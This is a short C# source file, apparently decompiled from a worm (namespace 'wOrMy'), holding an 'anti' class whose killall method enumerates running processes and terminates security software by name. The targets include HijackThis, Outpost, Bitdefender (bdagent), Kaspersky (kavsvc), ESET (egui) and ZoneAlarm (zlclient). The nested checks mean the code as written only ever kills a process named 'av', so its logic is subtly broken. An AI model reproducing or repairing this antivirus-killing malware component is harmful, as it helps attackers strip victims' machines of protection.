using System.Diagnostics;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace wOrMy;

[StandardModule]
internal sealed class anti
{
	public static void killall()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("av"), false) != 0)
				{
					continue;
				}
				processes[i].Kill();
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("hijackthis"), false) != 0)
				{
					continue;
				}
				processes[i].Kill();
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("sample"), false) != 0)
				{
					continue;
				}
				processes[i].Kill();
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("outpost"), false) != 0)
				{
					continue;
				}
				processes[i].Kill();
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("npfmsg"), false) != 0)
				{
					continue;
				}
				processes[i].Kill();
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("bdagent"), false) != 0)
				{
					continue;
				}
				processes[i].Kill();
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("kavsvc"), false) != 0)
				{
					continue;
				}
				processes[i].Kill();
				if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("egui"), false) == 0)
				{
					processes[i].Kill();
					if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("zlclient"), false) == 0)
					{
						processes[i].Kill();
					}
				}
			}
		}
	}
}
